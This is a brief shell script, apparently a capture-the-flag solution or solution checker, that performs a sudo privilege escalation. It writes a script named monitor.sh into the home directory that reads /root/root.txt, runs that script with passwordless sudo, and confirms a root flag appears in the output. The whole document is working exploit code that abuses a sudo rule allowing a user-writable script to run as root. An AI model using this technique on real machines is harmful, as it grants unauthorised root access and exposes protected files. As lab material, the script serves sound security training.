set -eu
cat > "$HOME/monitor.sh" <<'EOF'
#!/bin/sh
cat /root/root.txt
EOF
chmod 0755 "$HOME/monitor.sh"
out=$(sudo -n "$HOME/monitor.sh" 2>&1)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "script did not run as root" >&2; exit 1; }
